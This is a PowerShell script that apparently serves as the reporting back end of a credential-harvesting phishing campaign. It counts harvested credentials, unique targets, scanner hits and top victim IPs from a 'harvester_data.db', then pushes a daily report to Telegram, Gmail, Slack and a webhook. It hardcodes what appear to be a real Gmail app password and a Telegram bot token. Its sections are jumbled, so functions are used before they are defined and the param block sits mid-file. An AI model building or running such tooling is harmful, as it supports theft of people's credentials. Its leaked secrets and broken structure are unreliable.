# --- WEBHOOK/HTTP POST ALERT CHANNEL ---
$WebhookUrl = "https://your-webhook-endpoint.example.com/alert"  # Set your endpoint here
function Send-WebhookAlert($payload) {
    $webhookAction = { Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'application/json' | Out-Null }
    Invoke-WithRetry $webhookAction 3 5 "Webhook send"
}
# --- SEND TO WEBHOOK (if configured) ---
if ($WebhookUrl -and $WebhookUrl -ne "") {
    $webhookPayload = @{ report = $reportStr; timestamp = (Get-Date).ToString("o") }
    Send-WebhookAlert $webhookPayload
}
# --- HEALTH CHECKS & SELF-HEALING ---
function Run-HealthChecks {
    $issues = @()
    # Check DB file
    if (!(Test-Path $dbPath)) { $issues += "[HEALTH] DB file missing: $dbPath" }
    # Check disk space (warn if < 500MB free)
    $freeMB = [math]::Round((Get-PSDrive -Name (Split-Path $dbPath -Qualifier)).Free/1MB,2)
    if ($freeMB -lt 500) { $issues += "[HEALTH] Low disk space: $freeMB MB free" }
    # Check network (Google DNS)
    try { Test-Connection 8.8.8.8 -Count 1 -Quiet | Out-Null } catch { $issues += "[HEALTH] Network unreachable" }
    # Self-healing: attempt to recreate DB if missing
    if ($issues -contains "[HEALTH] DB file missing: $dbPath") {
        try {
            & $sqlitePath $dbPath "CREATE TABLE IF NOT EXISTS telemetry (id INTEGER PRIMARY KEY, event_type TEXT, email TEXT, ip TEXT, timestamp TEXT)"
            Write-Log "[SELF-HEAL] Recreated missing DB file."
        } catch { Write-Log "[SELF-HEAL] Failed to recreate DB: $($_.Exception.Message)" }
    }
    # Alert and log issues
    foreach ($issue in $issues) {
        Write-Log $issue
        if ($TelegramBotToken -and $ChatId) {
            $url = "https://api.telegram.org/bot$TelegramBotToken/sendMessage?chat_id=$ChatId&text=$([uri]::EscapeDataString($issue))"
            try { Invoke-RestMethod -Uri $url | Out-Null } catch {}
        }
    }
    return $issues.Count -eq 0
}
# --- RUN HEALTH CHECKS BEFORE MAIN LOGIC ---
if (-not (Run-HealthChecks)) {
    Write-Log "[FATAL] Health checks failed. Aborting daily report."
    exit 1
}
# --- RETRY HELPER ---
function Invoke-WithRetry {
    param(
        [scriptblock]$Action,
        [int]$MaxRetries = 3,
        [int]$DelaySeconds = 5,
        [string]$ActionName = "Action"
    )
    $attempt = 0
    while ($attempt -lt $MaxRetries) {
        try {
            & $Action
            if ($?) {
                Write-Log "[OK] $ActionName succeeded on attempt $($attempt+1)."
                return $true
            }
        } catch {
            Write-Log "[WARN] $ActionName failed on attempt $($attempt+1): $($_.Exception.Message)"
        }
        Start-Sleep -Seconds $DelaySeconds
        $attempt++
    }
    Write-Log "[ERROR] $ActionName failed after $MaxRetries attempts."
    return $false
}
# --- LOGGING SETUP ---
$logFile = "./daily_report.log"
function Write-Log {
    param([string]$msg)
    $timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    "$timestamp $msg" | Out-File -FilePath $logFile -Append -Encoding utf8
}
# Email and Telegram Daily Report Script
# Sends a daily campaign summary and attaches latest boardroom snapshot CSV to both email and Telegram.
#
# Gmail users: You must use an App Password (not your regular Gmail password) if you have 2-Step Verification enabled. Generate one at https://myaccount.google.com/apppasswords

param(
    [string]$SmtpServer = "smtp.gmail.com",

    [int]$SmtpPort = 587,

    [string]$SmtpUser = "jason.cyber.dev@gmail.com",

    [string]$SmtpPass = "zuuxxkkerewywihn",  # Gmail App Password


    [string]$MailTo = "jason.cyber.dev@gmail.com",

    [string]$TelegramBotToken = "8486086452:AAFB2NUlC4Mc58tT0AXpX8FM7dMFMm-26pM",

    [string]$ChatId = "8485160683",

    [string]$SlackWebhook = $env:SLACK_WEBHOOK_URL,
    
    [string[]]$ExtraAttachments = @()
)

function Send-TelegramAlert($msg) {
    # Enhanced formatting: add session/anomaly details if present
    $formattedMsg = $msg
    if ($SessionDetails) {
        $formattedMsg += "`nSession: $($SessionDetails | ConvertTo-Json -Compress)"
    }
    if ($AnomalyDetails) {
        $formattedMsg += "`nAnomaly: $($AnomalyDetails | ConvertTo-Json -Compress)"
    }
    $url = "https://api.telegram.org/bot$TelegramBotToken/sendMessage?chat_id=$ChatId&text=$([uri]::EscapeDataString($formattedMsg))"
    Invoke-WithRetry { Invoke-RestMethod -Uri $url | Out-Null } 3 5 "Telegram alert"
}

function Send-EmailWithAttachment($subject, $body, $attachment, $extraAttachments) {
    $smtp = New-Object Net.Mail.SmtpClient($SmtpServer, $SmtpPort)
    $smtp.EnableSsl = $true
    $smtp.Credentials = New-Object System.Net.NetworkCredential($SmtpUser, $SmtpPass)
    $mail = New-Object Net.Mail.MailMessage($SmtpUser, $MailTo, $subject, $body)
    if ($attachment -and (Test-Path $attachment)) { $mail.Attachments.Add($attachment) }
    foreach ($att in $extraAttachments) { if (Test-Path $att) { $mail.Attachments.Add($att) } }
    $sendMail = { $smtp.Send($mail) }
    $success = Invoke-WithRetry $sendMail 3 5 "Email send"
    if ($success) {
        Write-Log "[OK] Email sent to $MailTo."
    } else {
        $errMsg = "[SMTP ERROR] Email failed after retries."
        Write-Host $errMsg -ForegroundColor Red
        Write-Log $errMsg
        # Notify Telegram if email fails
        if ($TelegramBotToken -and $ChatId) {
            $url = "https://api.telegram.org/bot$TelegramBotToken/sendMessage?chat_id=$ChatId&text=$([uri]::EscapeDataString($errMsg))"
            try { Invoke-RestMethod -Uri $url | Out-Null } catch {}
        }
    }
# --- LOG REPORT SEND ---
Write-Log "[INFO] Daily report script executed."
}


# --- METRICS EXTRACTION ---
$sqlitePath = "C:/Users/HomePC/Downloads/sqlite-tools-win-x64-3530000/sqlite3.exe"
$dbPath = ".\\harvester_data.db"

# Core metrics
$totalHarvest = & $sqlitePath $dbPath "SELECT COUNT(*) FROM telemetry WHERE event_type = 'Credential_Harvest'"
$uniqueTargets = & $sqlitePath $dbPath "SELECT COUNT(DISTINCT email) FROM telemetry WHERE event_type = 'Credential_Harvest'"
$mttd = & $sqlitePath $dbPath "SELECT AVG(julianday(timestamp) - julianday((SELECT MIN(timestamp) FROM telemetry))) * 24 * 60 FROM telemetry WHERE event_type = 'Credential_Harvest'"

# Detection rate (scanners vs. harvests)
$scannerHits = & $sqlitePath $dbPath "SELECT COUNT(*) FROM telemetry WHERE event_type = 'Scanner_Hit'"
$detectionRate = if ($totalHarvest -eq 0) { 0 } else { [math]::Round(($scannerHits / $totalHarvest) * 100, 2) }

# Top 3 target locations (by IP, as a proxy)
$topLocations = & $sqlitePath $dbPath "SELECT ip, COUNT(*) as cnt FROM telemetry WHERE event_type = 'Credential_Harvest' GROUP BY ip ORDER BY cnt DESC LIMIT 3"
$topLocationsStr = ($topLocations -join ", ").Replace("|", " - ")

# Failed deliveries (skip if table does not exist)
$failedDeliveries = 0
if (Test-Path $dbPath) {
    try {
        $tableExists = & $sqlitePath $dbPath "SELECT name FROM sqlite_master WHERE type='table' AND name='delivery_failures'"
        if ($tableExists) {
            $failedDeliveries = & $sqlitePath $dbPath "SELECT COUNT(*) FROM delivery_failures"
        }
    } catch {}
}

# Time to first hit (minutes)
$firstHit = & $sqlitePath $dbPath "SELECT MIN(timestamp) FROM telemetry WHERE event_type = 'Credential_Harvest'"
$campaignStart = & $sqlitePath $dbPath "SELECT MIN(timestamp) FROM telemetry"
$ttfh = 0
if ($firstHit -and $campaignStart) {
    $ttfh = & $sqlitePath $dbPath "SELECT (julianday('$firstHit') - julianday('$campaignStart')) * 24 * 60"
}

# --- FIND LATEST SNAPSHOT ---
$snapshotDir = ".\board_snapshots"
$latestSnapshot = Get-ChildItem $snapshotDir -Filter *.csv | Sort-Object LastWriteTime -Descending | Select-Object -First 1

# --- CUSTOMIZED REPORT ---
$report = @()
$report += "[DAILY REPORT]"
$report += "Total Harvested: $totalHarvest"
$report += "Unique Targets: $uniqueTargets"
$report += "MTTD (min): $([math]::Round($mttd,2))"
$report += "Detection Rate: $detectionRate% (Scanners: $scannerHits)"
$report += "Top Target IPs: $topLocationsStr"
$report += "Failed Deliveries: $failedDeliveries"
$report += "Time to First Hit: $([math]::Round($ttfh,2)) min"
$reportStr = $report -join "`n"

# --- SEND TO TELEGRAM ---
Send-TelegramAlert $reportStr

# --- SEND EMAIL WITH ATTACHMENT ---
# --- SEND EMAIL WITH ATTACHMENT ---

$subject = "Daily Campaign Report"
$body = $reportStr
$attachment = $null
if ($latestSnapshot) { $attachment = $latestSnapshot.FullName }
Send-EmailWithAttachment $subject $body $attachment $ExtraAttachments

# --- SEND TO SLACK (if configured) ---
if ($SlackWebhook -and $SlackWebhook -ne "") {
    $slackMsg = $reportStr -replace "\n", "\n"
    $payload = @{ text = $slackMsg } | ConvertTo-Json
    $slackAction = { Invoke-RestMethod -Uri $SlackWebhook -Method Post -Body $payload -ContentType 'application/json' | Out-Null }
    Invoke-WithRetry $slackAction 3 5 "Slack send"
}

# Schedule this script for daily execution.
